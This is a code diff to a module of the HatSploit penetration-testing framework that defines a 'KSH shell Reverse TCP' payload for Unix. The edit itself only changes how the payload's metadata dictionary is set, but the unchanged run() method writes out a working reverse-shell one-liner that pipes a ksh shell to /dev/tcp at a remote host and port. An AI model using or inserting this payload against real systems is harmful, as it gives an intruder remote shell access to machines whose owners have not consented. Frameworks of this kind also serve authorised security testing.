@@ -10,7 +10,7 @@ class HatSploitPayload(Payload):
     def __init__(self):
         super().__init__()
 
-        self.details = {
+        self.details.update({
             'Name': "KSH shell Reverse TCP",
             'Payload': "unix/generic/ksh_reverse_tcp",
             'Authors': [
@@ -21,7 +21,7 @@ class HatSploitPayload(Payload):
             'Platform': "unix",
             'Rank': "high",
             'Type': "reverse_tcp",
-        }
+        })
 
     def run(self):
         payload = f"ksh -c 'ksh >/dev/tcp/{self.rhost.value}/{self.rport.value} 2>&1 <&1'"
